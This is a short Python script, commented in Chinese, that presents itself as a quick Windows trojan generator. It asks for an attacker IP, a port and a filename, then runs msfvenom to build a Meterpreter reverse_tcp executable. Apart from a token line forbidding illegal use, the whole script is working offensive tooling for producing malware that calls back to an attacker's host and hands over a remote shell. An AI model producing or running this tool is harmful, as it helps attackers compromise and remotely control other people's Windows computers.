import socket
import os
import requests
# 工具介绍
print("这是一个基于msfvenom命令开发的Windows木马快速生成工具")
print("禁止用于任何非法用途")
# 主体部分

lhost= input("请输入您当前的局域网/公网IP: ")
lport = input("请输入监听端口: ")
# ftype = input("文件类型为(默认为exe): ") 
fname = input("文件名为: ") + ".exe"
wc = "msfvenom" + " -p windows/meterpreter/reverse_tcp" + " LHOST=" + lhost + " LPORT=" + lport + " -f exe" + " -o " + fname
result = os.system(wc)
print(result)
